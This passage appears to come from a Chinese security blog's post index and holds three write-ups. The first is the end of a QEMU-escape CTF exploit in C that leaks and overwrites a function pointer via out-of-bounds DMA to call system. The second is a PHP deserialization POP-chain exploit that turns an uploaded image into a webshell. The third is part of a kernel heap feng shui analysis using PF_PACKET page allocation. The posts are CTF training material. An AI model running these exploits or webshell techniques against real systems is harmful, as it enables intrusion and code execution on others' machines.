puts(&quot;read&quot;);        close(fd);        return 0;    &#125;    if (!(data &amp; (((uint64_t)1 &lt;&lt; 63))))    &#123;        puts(&quot;page&quot;);        close(fd);        return 0;    &#125;    size_t pageframenum = data &amp; ((1ull &lt;&lt; 55) - 1);    size_t phyaddr = pageframenum * PAGE_SIZE + (uintptr_t)addr % PAGE_SIZE;    close(fd);    return phyaddr;&#125;#define DMABASE 0x40000char *userbuf;uint64_t phy_userbuf;unsigned char *mmio_mem;void mmio_write(uint32_t addr, uint32_t value)&#123;    *((uint32_t *)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123;    return *((uint32_t *)(mmio_mem + addr));&#125;void dma_set_src(uint32_t src_addr)&#123;    mmio_write(0x80, src_addr);&#125;void dma_set_dst(uint32_t dst_addr)&#123;    mmio_write(0x88, dst_addr);&#125;void dma_set_cnt(uint32_t cnt)&#123;    mmio_write(0x90, cnt);&#125;void dma_do_cmd(uint32_t cmd)&#123;    mmio_write(0x98, cmd);&#125;void dma_do_write(uint32_t addr, void *buf, size_t len)&#123;    memcpy(userbuf, buf, len);    dma_set_src(phy_userbuf);    dma_set_dst(addr);    dma_set_cnt(len);    dma_do_cmd(0 | 1);    sleep(1);&#125;void dma_do_read(uint32_t addr, size_t len)&#123;    dma_set_dst(phy_userbuf);    dma_set_src(addr);    dma_set_cnt(len);    dma_do_cmd(2 | 1);    sleep(1);&#125;void dma_do_enc(uint32_t addr, size_t len)&#123;    dma_set_src(addr);    dma_set_cnt(len);    dma_do_cmd(1 | 4 | 2);&#125;int main()&#123;    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;, O_RDWR | O_SYNC);    if (mmio_fd == -1)        die(&quot;mmio_fd open failed&quot;);    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);    if (mmio_mem == MAP_FAILED)        die(&quot;mmap mmio_mem failed&quot;);    printf(&quot;mmio_mem @ %p\\n&quot;, mmio_mem);    // Allocate DMA buffer and obtain its physical address    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);    if (userbuf == MAP_FAILED)        die(&quot;mmap&quot;);    mlock(userbuf, 0x1000);    phy_userbuf = va2pa(userbuf);    printf(&quot;user buff virtual address: %p\\n&quot;, userbuf);    printf(&quot;user buff physical address: %p\\n&quot;, (void *)phy_userbuf);    // out of bound to leak enc ptr    dma_do_read(0x1000 + DMABASE, 8);    uint64_t leak_enc = *(uint64_t *)userbuf;    printf(&quot;leaking enc function: %p\\n&quot;, (void *)leak_enc);    uint64_t pro_base = leak_enc - 0x283DD0;    uint64_t system_plt = pro_base + 0x1FDB18;    // out of bound to overwrite enc ptr to system ptr    dma_do_write(0x1000 + DMABASE, &amp;system_plt, 8);    // deply the parameter of system function    char *command = &quot;cat flag\\x00&quot;;    dma_do_write(0x200 + DMABASE, command, strlen(command));    // trigger the enc ptr to execute system    dma_do_enc(0x200 + DMABASE, 8);    return 0;&#125;\n\n\n调试脚本：\n#!/bin/bashpid=`ps -aux | grep &quot;qemu-system-x86_64&quot; | grep -v &quot;grep&quot; | awk &#x27;&#123;print($2)&#125;&#x27;`sudo gdb \\-ex &quot;file qemu-system-x86_64&quot; \\-ex &quot;attach $pid&quot; \\-ex &quot;b*\\$rebase(0x284191)&quot;\n\n\n\n题目地址：https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz\n参考链接：\nhttps://www.anquanke.com/post/id/224199#h3-5\nhttps://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup\nhttps://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio\n","categories":["qemu escape"],"tags":["qemu escape"]},{"title":"强网杯_2019_Upload","url":"/2021/09/24/qwb-2019-Upload/","content":"获取题目信息点是题目是登录注册窗口，随便注册进入，发现里面是一个上传文件页面，上传之后，就会进入到假想的聊天页面，观察url地址都是index.php/home这种类型的一般来说就是thinkphp了，然后找不到东西了，就开始扫。\n\n扫出来两个敏感信息，robots.txt里面什么都没有，www.tar.gz直接源码泄漏开始代码审计。\n分析源码查看了几个控制器，在Profile控制器找到了漏洞。\npublic function upload_img()&#123;    if($this-&gt;checker)&#123;        if(!$this-&gt;checker-&gt;login_check())&#123;            $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;            $this-&gt;redirect($curr_url,302);            exit();        &#125;    &#125;    if(!empty($_FILES))&#123;        $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;        $this-&gt;ext_check();    &#125;    if($this-&gt;ext) &#123;        if(getimagesize($this-&gt;filename_tmp)) &#123;            @copy($this-&gt;filename_tmp, $this-&gt;filename);             // 在这里会将前一个文件复制到后一个文件，那么我们只需要上传一个图片马，然后将图片马的数据随便新建一个php文件就可以getshell了            @unlink($this-&gt;filename_tmp);            $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;            $this-&gt;update_img();        &#125;else&#123;            $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));        &#125;    &#125;else&#123;        $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));    &#125;&#125;\n\n顺着链子往回找，这个Profile类只有两个魔术方法\npublic function __get($name)&#123;    return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123;    if($this-&gt;&#123;$name&#125;)&#123;        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n我们需要在call调用$this-&gt;upload_img()，也就是要$this-&gt;{$name} === ‘upload_img’。然后这边先不管因为$name我们还不知道从哪里传过来。\n几个控制器当中只有Register控制器存在destruct\npublic function __destruct()&#123;    if(!$this-&gt;registed)&#123;        $this-&gt;checker-&gt;index();    &#125;&#125;\n\n所以现在就可以知道上面的$name就是’index’，该怎么从’index’变到’upload_img’\npublic function __get($name)&#123;    return $this-&gt;except[$name];// 这里给$this-&gt;&#123;$name&#125;赋值，要使得下面的$this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;，那现在后面的键是可控的payload就很好生成了&#125;public function __call($name, $arguments)&#123;    if($this-&gt;&#123;$name&#125;)&#123; // &lt;--这里就是调用 $this-&gt;index但是没有index这个属性，所以进入get        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n最终的exp\n&lt;?phpnamespace app\\web\\controller;class Profile&#123;    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __construct()    &#123;        $this-&gt;except = array(&#x27;index&#x27; =&gt; &#x27;img&#x27;);        $this-&gt;img = &#x27;upload_img&#x27;;        $this-&gt;ext = &#x27;png&#x27;;        $this-&gt;filename_tmp = &#x27;../public/upload/b9730141a9b1dc25bccf4fafca028590/107f23d9a1bb68ad9188843933a6065f.png&#x27;;        $this-&gt;filename = &#x27;../public/upload/b9730141a9b1dc25bccf4fafca028590/107f23d9a1bb68ad9188843933a6065f.php&#x27;;    &#125;&#125;class Register&#123;    public $checker;    public $registed;    public function __construct()    &#123;        $this-&gt;registed = false;        $this-&gt;checker = new Profile();    &#125;&#125;echo (base64_encode(serialize(new Register())));\n\n\n上传生成的payload用蚁剑连接，拿到flag\n","categories":["web-buuctf"],"tags":["pop链","upload"]},{"title":"向pipe_buffer说yes！","url":"/2023/05/24/pipe-buffer/","content":"\n前言起因是墨晚鸢大佬的一句回复，不过我这里还没尝试挖掘新的东西，更多的是对墨晚鸢佬的内容做适合自己理解的总结。可以看到标签中还有一个上一篇文章主要介绍的io_uring，这里就先说说。\n万字警告！！！\nio_uring在堆喷中的局限性int __io_account_mem(struct user_struct *user, unsigned long nr_pages)&#123;\tunsigned long page_limit, cur_pages, new_pages;\tif (!nr_pages)\t\treturn 0;\t/* Don&#x27;t allow more pages than we can safely lock */\tpage_limit = rlimit(RLIMIT_MEMLOCK) &gt;&gt; PAGE_SHIFT;\tcur_pages = atomic_long_read(&amp;user-&gt;locked_vm);\tdo &#123;\t\tnew_pages = cur_pages + nr_pages;\t\tif (new_pages &gt; page_limit)\t\t\treturn -ENOMEM;\t&#125; while (!atomic_long_try_cmpxchg(&amp;user-&gt;locked_vm,\t\t\t\t\t  &amp;cur_pages, new_pages));\treturn 0;&#125;\n\n在我进行一次堆喷过后，并使用update去修改内容是会返回错误-12，则是在上面的函数中，new_page超过了可以安全lock的page数量，也就是new_pages &gt; page_limit导致的。\n而上面这个函数最初是由io_sqe_buffer_register函数调用的，所以不幸的是在对io_uring进行分配的时候就要开始考虑了。所以在我们平时动不动就要面对4096次之类的大范围堆喷时io_uring就显得有点儿力不从心了。\n不过除了以上这样一点缺点io_uring的表现依旧是令人满意的。\nslab分配源码分析众所周知，分配slab的机制为buddy system机制进行的。而进行分配的最终函数为alloc_slab_page函数进行分配，并且大家都知道buddy system分配时大小为PAGE_SIZE * pow(2,order)，所以order的由来就显得尤为重要了。\nstatic inline unsigned int oo_order(struct kmem_cache_order_objects x)&#123;\treturn x.x &gt;&gt; OO_SHIFT;&#125;static inline struct slab *alloc_slab_page(gfp_t flags, int node,\t\tstruct kmem_cache_order_objects oo)&#123;\tstruct folio *folio;\tstruct slab *slab;\tunsigned int order = oo_order(oo);\tif (node == NUMA_NO_NODE)\t\tfolio = (struct folio *)alloc_pages(flags, order);\telse\t\tfolio = (struct folio *)__alloc_pages_node(node, flags, order);\tif (!folio)\t\treturn NULL;\tslab = folio_slab(folio);\t__folio_set_slab(folio);\t/* Make the flag visible before any changes to folio-&gt;mapping */\tsmp_wmb();\tif (page_is_pfmemalloc(folio_page(folio, 0)))\t\tslab_set_pfmemalloc(slab);\treturn slab;&#125;\n\n可以看到在alloc_slab_page函数中使用order是在oo中，而这个oo这时kmem_cache结构体中的成员。\nkmem_cache_create_usercopy流程kmem_cache_create_usercopy用来注册一个cache，所以他也会分配一个slab供他自己使用，不过分配的时间点是在这个cache中第一次申请object的时候触发的。而kmem_cache_create_usercopy函数主要是对slab的初始化，其中就包括了我们比较关注的order了。\n因为前半部分的函数都没有直接和order产生关系，所以这里就给一下大家调用连不贴源码占篇幅了。\nkmem_cache_create_usercopy=&gt;create_cache=&gt;__kmem_cache_create=&gt;kmem_cache_open=&gt;calculate_sizes\ncalculate_sizes函数static int calculate_sizes(struct kmem_cache *s)&#123;\tslab_flags_t flags = s-&gt;flags;\tunsigned int size = s-&gt;object_size;\tunsigned int order;\t... ...\torder = calculate_order(size);\tif ((int)order &lt; 0)\t\treturn 0;\ts-&gt;allocflags = 0;\tif (order)\t\ts-&gt;allocflags |= __GFP_COMP;\tif (s-&gt;flags &amp; SLAB_CACHE_DMA)\t\ts-&gt;allocflags |= GFP_DMA;\tif (s-&gt;flags &amp; SLAB_CACHE_DMA32)\t\ts-&gt;allocflags |= GFP_DMA32;\tif (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)\t\ts-&gt;allocflags |= __GFP_RECLAIMABLE;\t/*\t * Determine the number of objects per slab\t */\ts-&gt;oo = oo_make(order, size);\ts-&gt;min = oo_make(get_order(size), size);\treturn !!oo_objects(s-&gt;oo);&#125;\n\n可以看到在函数最后这部分就是对oo的赋值，所以理所应当去calculate_order理清逻辑。\ncalculate_order函数static inline int calculate_order(unsigned int size)&#123;\tunsigned int order;\tunsigned int min_objects;\tunsigned int max_objects;\tunsigned int nr_cpus;\t/*\t * Attempt to find best configuration for a slab. This\t * works by first attempting to generate a layout with\t * the best configuration and backing off gradually.\t *\t * First we increase the acceptable waste in a slab. Then\t * we reduce the minimum objects required in a slab.\t */\tmin_objects = slub_min_objects;\tif (!min_objects) &#123;\t\t/*\t\t * Some architectures will only update present cpus when\t\t * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But\t\t * we also don&#x27;t want to use nr_cpu_ids always, as on some other\t\t * architectures, there can be many possible cpus, but never\t\t * onlined. Here we compromise between trying to avoid too high\t\t * order on systems that appear larger than they are, and too\t\t * low order on systems that appear smaller than they are.\t\t */\t\tnr_cpus = num_present_cpus();\t\tif (nr_cpus &lt;= 1)\t\t\tnr_cpus = nr_cpu_ids;\t\tmin_objects = 4 * (fls(nr_cpus) + 1);\t&#125;\tmax_objects = order_objects(slub_max_order, size);\tmin_objects = min(min_objects, max_objects);\twhile (min_objects &gt; 1) &#123;\t\tunsigned int fraction;\t\tfraction = 16;\t\twhile (fraction &gt;= 4) &#123;\t\t\torder = calc_slab_order(size, min_objects,\t\t\t\t\tslub_max_order, fraction);\t\t\tif (order &lt;= slub_max_order)\t\t\t\treturn order;\t\t\tfraction /= 2;\t\t&#125;\t\tmin_objects--;\t&#125;\t/*\t * We were unable to place multiple objects in a slab. Now\t * lets see if we can place a single object there.\t */\torder = calc_slab_order(size, 1, slub_max_order, 1);\tif (order &lt;= slub_max_order)\t\treturn order;\t/*\t * Doh this slab cannot be placed using slub_max_order.\t */\torder = calc_slab_order(size, 1, MAX_ORDER, 1);\tif (order &lt; MAX_ORDER)\t\treturn order;\treturn -ENOSYS;&#125;\n\n可以注意到最终的order是由calc_slab_order函数生成的。而这里的min_objects变量可以看到是由slub_min_objects赋值的。这个全局变量的含义是：每个slab的最小object数量，在没有配置的情况下是0。不过可以看到如果是0的话会进入到紧接着的if语句内，内部的nr_cpu_ids变量的值是处理器数。fls 可以获取参数的最高有效 bit 的位数，比如 fls(0)=0，fls(1)=1，fls(4) = 3。如果当前系统中有4个cpu，那么 min_object 的初始值为 4*(3+1) = 16。\n~ cat /proc/kallsyms | grep slub_min_objectsffffffff8a23b2d0 t __cfi_setup_slub_min_objectsffffffff8a23b2e0 t setup_slub_min_objectsffffffff8a4348af t __setup_str_setup_slub_min_objectsffffffff8a45e460 t __setup_setup_slub_min_objectsffffffff8b3d5fbc b slub_min_objects------pwndbg&gt; x/1xw 0xffffffff8b3d5fbc0xffffffff8b3d5fbc:\t0x00000000pwndbg&gt; \n\n~ cat /proc/kallsyms | grep nr_cpu_idsffffffff97f73fa8 D nr_cpu_idsffffffff98025f10 T __cfi_setup_nr_cpu_idsffffffff98025f20 T setup_nr_cpu_idsffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids------pwndbg&gt; x/1xw 0xffffffff97f73fa80xffffffff97f73fa8:\t0x00000004pwndbg&gt; \n\n按照上述步骤查看之后可以看到nr_cpu_ids的值为4，所以这里的min_object的值为0x10。\n而函数中fraction是对于碎片的一种指标。碎片大小不能超过 (slab所占内存大小 / fraction)，fraction 值越大，slab 中所能容忍的碎片就越小。\ncalc_slab_order函数int ilog2(unsigned long v)&#123;\tint l = 0;\twhile ((1UL &lt;&lt; l) &lt; v)\t\tl++;\treturn l;&#125;static __always_inline __attribute_const__ int get_order(unsigned long size)&#123;\tif (__builtin_constant_p(size)) &#123;\t\tif (!size)\t\t\treturn BITS_PER_LONG - PAGE_SHIFT;\t\tif (size &lt; (1UL &lt;&lt; PAGE_SHIFT))\t\t\treturn 0;\t\treturn ilog2((size) - 1) - PAGE_SHIFT + 1;\t&#125;\tsize--;\tsize &gt;&gt;= PAGE_SHIFT;#if BITS_PER_LONG == 32\treturn fls(size);#else\treturn fls64(size);#endif&#125;static inline unsigned int calc_slab_order(unsigned int size,\t\tunsigned int min_objects, unsigned int max_order,\t\tunsigned int fract_leftover)&#123;\tunsigned int min_order = slub_min_order;\tunsigned int order;\tif (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)\t\treturn get_order(size * MAX_OBJS_PER_PAGE) - 1;\tfor (order = max(min_order, (unsigned int)get_order(min_objects * size));\t\t\torder &lt;= max_order; order++) &#123;\t\tunsigned int slab_size = (unsigned int)PAGE_SIZE &lt;&lt; order;\t\tunsigned int rem;\t\trem = slab_size % size;\t\tif (rem &lt;= slab_size / fract_leftover)\t\t\tbreak;\t&#125;\treturn order;&#125;\n\n这个函数就是最终计算出order的函数了，可以看到这里会从slab所需要的最小order到最大order之间开始遍历，查找能够使slab碎片最小的order值。而rem则是slab的碎片大小：分配完object之后，所产生的碎片大小。碎片大小rem不能超过slab_size / fract_leftover即符合要求。\n这里的get_order函数也较为简单，这狗屎玩意，开始看错了文件导致一直看不懂，硬生生看了两个小时才反应过来了。也就是根据size返回对应的最小的order，所以这里的如果根据上一个函数中的min_object的值为0x10来看的话，最终返回的order也就是3。\nstatic inline unsigned int order_objects(unsigned int order, unsigned int size)&#123;\treturn ((unsigned int)PAGE_SIZE &lt;&lt; order) / size;&#125;static inline struct kmem_cache_order_objects oo_make(unsigned int order,\t\tunsigned int size)&#123;\tstruct kmem_cache_order_objects x = &#123;\t\t(order &lt;&lt; OO_SHIFT) + order_objects(order, size)\t&#125;;\treturn x;&#125;\n\n最后由oo_make函数写入到oo成员中去了。\nkmem_cache_alloc流程可以看到前面kmem_cache_create_usercopy函数只是对kmem_cache结构体里面的成员进行初始化赋值，并没有实质性的生成slab。而真正分配slab是在第一次对这个cache申请object的时候，也就是这个小标题的函数。\n这里的调用流程就是：kmem_cache_alloc=&gt;__kmem_cache_alloc_lru=&gt;slab_alloc=&gt;slab_alloc_node=&gt;__slab_alloc_node=&gt;new_slab=&gt;allocate_slab=&gt;alloc_slab_page\n__slab_alloc_node函数static void *__slab_alloc_node(struct kmem_cache *s,\t\tgfp_t gfpflags, int node, unsigned long addr, size_t orig_size)&#123;\tstruct partial_context pc;\tstruct slab *slab;\tvoid *object;\tpc.flags = gfpflags;\tpc.slab = &amp;slab;\tpc.orig_size = orig_size;\tobject = get_partial(s, node, &amp;pc);\tif (object)\t\treturn object;\tslab = new_slab(s, gfpflags, node);\tif (unlikely(!slab)) &#123;\t\tslab_out_of_memory(s, gfpflags, node);\t\treturn NULL;\t&#125;\tobject = alloc_single_from_new_slab(s, slab, orig_size);\treturn object;&#125;\n\n可以看到分配顺序就是首先访问partial指针中，如果其中没有可以返回的object就会执行到new_slab函数分配新的slab。\nalloc_single_from_new_slab函数static void *alloc_single_from_new_slab(struct kmem_cache *s,\t\t\t\t\tstruct slab *slab, int orig_size)&#123;\tint nid = slab_nid(slab);\tstruct kmem_cache_node *n = get_node(s, nid);\tunsigned long flags;\tvoid *object;\tobject = slab-&gt;freelist;\tslab-&gt;freelist = get_freepointer(s, object);\tslab-&gt;inuse = 1;\tif (!alloc_debug_processing(s, slab, object, orig_size))\t\t/*\t\t * It&#x27;s not really expected that this would fail on a\t\t * freshly allocated slab, but a concurrent memory\t\t * corruption in theory could cause that.\t\t */\t\treturn NULL;\tspin_lock_irqsave(&amp;n-&gt;list_lock, flags);\tif (slab-&gt;inuse == slab-&gt;objects)\t\tadd_full(s, n, slab);\telse\t\tadd_partial(n, slab, DEACTIVATE_TO_HEAD);\tinc_slabs_node(s, nid, slab-&gt;objects);\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\treturn object;&#125;\n\n这里主要做的事就是首先取下freelist指向的object，随后将slab添加到partial指针处。\nallocate_slab函数上面提到了new_slab函数，其实实质上调用的是这个函数\nstatic struct slab *allocate_slab(struct kmem_cache *s, gfp_t flags, int node)&#123;\tstruct slab *slab;\tstruct kmem_cache_order_objects oo = s-&gt;oo;\tgfp_t alloc_gfp;\tvoid *start, *p, *next;\tint idx;\tbool shuffle;\t... ...\tslab = alloc_slab_page(alloc_gfp, node, oo);\tif (unlikely(!slab)) &#123;\t\too = s-&gt;min;\t\talloc_gfp = flags;\t\t/*\t\t * Allocation may have failed due to fragmentation.\t\t * Try a lower order alloc if possible\t\t */\t\tslab = alloc_slab_page(alloc_gfp, node, oo);\t\tif (unlikely(!slab))\t\t\treturn NULL;\t\tstat(s, ORDER_FALLBACK);\t&#125;\tslab-&gt;objects = oo_objects(oo);\tslab-&gt;inuse = 0;\tslab-&gt;frozen = 0;\taccount_slab(slab, oo_order(oo), s, flags);\tslab-&gt;slab_cache = s;\tkasan_poison_slab(slab);\tstart = slab_address(slab);\tsetup_slab_debug(s, slab, start);\tshuffle = shuffle_freelist(s, slab);\tif (!shuffle) &#123;\t\tstart = fixup_red_left(s, start);\t\tstart = setup_object(s, start);\t\tslab-&gt;freelist = start;\t\tfor (idx = 0, p = start; idx &lt; slab-&gt;objects - 1; idx++) &#123;\t\t\tnext = p + s-&gt;size;\t\t\tnext = setup_object(s, next);\t\t\tset_freepointer(s, p, next);\t\t\tp = next;\t\t&#125;\t\tset_freepointer(s, p, NULL);\t&#125;\treturn slab;&#125;\n\n这里对于新分配的slab首先写的就是他的freelist指针，所以根据上面外层函数的调用顺序来看，在刚挂载到freelist紧接着就会返回object并重新挂载到partial上。\n也可以看到这个函数中调用了在slab分配分析开头给出的函数alloc_slab_page。\n页级堆风水构造终于要说到跟题目有关系的内容了。\n如果提到一个驱动存在off by null或者off by one漏洞时，我的第一反应就是这个CVE-2021-22555中的办法，使用大量堆喷来完成。但是如果题目的slab是由kmem_cache_create_usercopy创建的话困难就会存在很大的问题了，如果你当前使用堆喷的堆块的order与创建的cache不一致，这样只有极低的概率可以让驱动生成的slab紧邻堆喷的slab。所以为了提高脚本的稳定性，出现了这一利用手法。\n其实这一手法以前在安全客中有看到但是当时并没有在意，所以现在借着墨晚鸢佬的博客学习一下。页级堆风水即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们手工构造一个新的已知的页级粒度内存页排布。\n在上述解释完slab的分配过程想必应该都能理解buddy system了，他的基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理（偷的图）：\n\n不难想到这个利用方式的原理就是：从更高阶 order 拆分成的两份低阶 order 的连续内存页是物理连续的，由此我们可以：\n\n  向 buddy system 请求两份连续的内存页\n  释放其中一份内存页，分配 vulnerable kmem_cache ，让其取走这份内存页\n  释放另一份内存页，使用 victim kmem_cache 堆喷，让其取走这份内存页\n\n那么此时我们可以使用vulnerable kmem_cache的off by null或off by one去修改到victim kmem_cache了。\n分配任意数量任意大小page根据上述内容来看，我们需要消耗掉小order的页面才能继续进行，这也就意味着我们需要一个可以申请指定order的API。这里选择是CVE-2017-7308中的方法。\n当我们创建一个 protocol 为 PF_PACKET 的 socket 之后，先调用 setsockopt() 将 PACKET_VERSION 设为 TPACKET_V1 / TPACKET_V2，再调用 setsockopt() 提交一个 PACKET_TX_RING ，此时便存在如下调用链：\n__sys_setsockopt=&gt;sock-&gt;ops-&gt;setsockopt=&gt;packet_setsockopt=&gt;packet_set_ring=&gt;alloc_pg_vec\nstatic struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)&#123;\tunsigned int block_nr = req-&gt;tp_block_nr;\tstruct pgv *pg_vec;\tint i;\tpg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);\tif (unlikely(!pg_vec))\t\tgoto out;\tfor (i = 0; i &lt; block_nr; i++) &#123;\t\tpg_vec[i].buffer = alloc_one_pg_vec_page(order);\t\tif (unlikely(!pg_vec[i].buffer))\t\t\tgoto out_free_pgvec;\t&#125;out:\treturn pg_vec;out_free_pgvec:\tfree_pg_vec(pg_vec, order, block_nr);\tpg_vec = NULL;\tgoto out;&#125;\n\n可以看到的是这里alloc_pg_vec函数通过alloc_one_pg_vec_page函数申请buffer。并且这里申请的数量为req-&gt;tp_block_nr而req是用户可控的，所以这里申请的数量是可控的。\nstatic char *alloc_one_pg_vec_page(unsigned long order)&#123;\tchar *buffer;\tgfp_t gfp_flags = GFP_KERNEL | __GFP_COMP |\t\t\t  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;\tbuffer = (char *) __get_free_pages(gfp_flags, order);\tif (buffer)\t\treturn buffer;\t/* __get_free_pages failed, fall back to vmalloc */\tbuffer = vzalloc(array_size((1 &lt;&lt; order), PAGE_SIZE));\tif (buffer)\t\treturn buffer;\t/* vmalloc failed, lets dig into swap here */\tgfp_flags &amp;= ~__GFP_NORETRY;\tbuffer = (char *) __get_free_pages(gfp_flags, order);\tif (buffer)\t\treturn buffer;\t/* complete and utter failure */\treturn NULL;&#125;\n\n而alloc_one_pg_vec_page函数使用__get_free_pages申请到page。\npacket_setsockopt(struct socket *sock, int level, int optname, sockptr_t optval,\t\t  unsigned int optlen)&#123;\tstruct sock *sk = sock-&gt;sk;\tstruct packet_sock *po = pkt_sk(sk);\tint ret;\tif (level != SOL_PACKET)\t\treturn -ENOPROTOOPT;\tswitch (optname) &#123;\tcase PACKET_ADD_MEMBERSHIP:\tcase PACKET_DROP_MEMBERSHIP:\t&#123;\t\tstruct packet_mreq_max mreq;\t\tint len = optlen;\t\tmemset(&amp;mreq, 0, sizeof(mreq));\t\tif (len &lt; sizeof(struct packet_mreq))\t\t\treturn -EINVAL;\t\tif (len &gt; sizeof(mreq))\t\t\tlen = sizeof(mreq);\t\tif (copy_from_sockptr(&amp;mreq, optval, len))\t\t\treturn -EFAULT;\t\tif (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))\t\t\treturn -EINVAL;\t\tif (optname == PACKET_ADD_MEMBERSHIP)\t\t\tret = packet_mc_add(sk, &amp;mreq);\t\telse\t\t\tret = packet_mc_drop(sk, &amp;mreq);\t\treturn ret;\t&#125;\tcase PACKET_RX_RING:\tcase PACKET_TX_RING:\t&#123;\t\tunion tpacket_req_u req_u;\t\tint len;\t\tlock_sock(sk);\t\tswitch (po-&gt;tp_version) &#123;\t\tcase TPACKET_V1:\t\tcase TPACKET_V2:\t\t\tlen = sizeof(req_u.req);\t\t\tbreak;\t\tcase TPACKET_V3:\t\tdefault:\t\t\tlen = sizeof(req_u.req3);\t\t\tbreak;\t\t&#125;\t\tif (optlen &lt; len) &#123;\t\t\tret = -EINVAL;\t\t&#125; else &#123;\t\t\tif (copy_from_sockptr(&amp;req_u.req, optval, len))\t\t\t\tret = -EFAULT;\t\t\telse\t\t\t\tret = packet_set_ring(sk, &amp;req_u, 0,\t\t\t\t\t\t    optname == PACKET_TX_RING);\t\t&#125;\t\trelease_sock(sk);\t\treturn ret;\t&#125;      ... ...  &#125;&#125;\n\n可以看到当我们的optname为PACKET_TX_RING时会调用到packet_set_ring，因为此时len的关系，我们还需要设置po-&gt;tp_version为TPACKET_V1/TPACKET_V2。\ncase PACKET_VERSION:\t&#123;\t\tint val;\t\tif (optlen != sizeof(val))\t\t\treturn -EINVAL;\t\tif (copy_from_sockptr(&amp;val, optval, sizeof(val)))\t\t\treturn -EFAULT;\t\tswitch (val) &#123;\t\tcase TPACKET_V1:\t\tcase TPACKET_V2:\t\tcase TPACKET_V3:\t\t\tbreak;\t\tdefault:\t\t\treturn -EINVAL;\t\t&#125;\t\tlock_sock(sk);\t\tif (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;\t\t\tret = -EBUSY;\t\t&#125; else &#123;\t\t\tpo-&gt;tp_version = val;\t\t\tret = 0;\t\t&#125;\t\trelease_sock(sk);\t\treturn ret;\t&#125;\n\n想要修改到po-&gt;tp_version需要进入到这个case，所以需要进行两次调用。\nstatic int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,\t\tint closing, int tx_ring)&#123;\tstruct pgv *pg_vec = NULL;\tstruct packet_sock *po = pkt_sk(sk);\tunsigned long *rx_owner_map = NULL;\tint was_running, order = 0;\tstruct packet_ring_buffer *rb;\tstruct sk_buff_head *rb_queue;\t__be16 num;\tint err;\t/* Added to avoid minimal code churn */\tstruct tpacket_req *req = &amp;req_u-&gt;req;\trb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;\trb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;\terr = -EBUSY;\tif (!closing) &#123;\t\tif (atomic_read(&amp;po-&gt;mapped))\t\t\tgoto out;\t\tif (packet_read_pending(rb))\t\t\tgoto out;\t&#125;\tif (req-&gt;tp_block_nr) &#123;\t\tunsigned int min_frame_size;\t\t... ...\t\terr = -ENOMEM;\t\torder = get_order(req-&gt;tp_block_size);\t\tpg_vec = alloc_pg_vec(req, order);    ... ...  &#125;  ... ...  if (closing || atomic_read(&amp;po-&gt;mapped) == 0) &#123;\t\terr = 0;\t\tspin_lock_bh(&amp;rb_queue-&gt;lock);\t\tswap(rb-&gt;pg_vec, pg_vec);\t\tif (po-&gt;tp_version &lt;= TPACKET_V2)\t\t\tswap(rb-&gt;rx_owner_map, rx_owner_map);\t\trb-&gt;frame_max = (req-&gt;tp_frame_nr - 1);\t\trb-&gt;head = 0;\t\trb-&gt;frame_size = req-&gt;tp_frame_size;\t\tspin_unlock_bh(&amp;rb_queue-&gt;lock);\t\tswap(rb-&gt;pg_vec_order, order);\t\tswap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);\t\trb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;\t\tpo-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?\t\t\t\t\t\ttpacket_rcv : packet_rcv;\t\tskb_queue_purge(rb_queue);\t\tif (atomic_read(&amp;po-&gt;mapped))\t\t\tpr_err(&quot;packet_mmap: vma is busy: %d\\n&quot;,\t\t\t       atomic_read(&amp;po-&gt;mapped));\t&#125;  ... ...out_free_pg_vec:\tif (pg_vec) 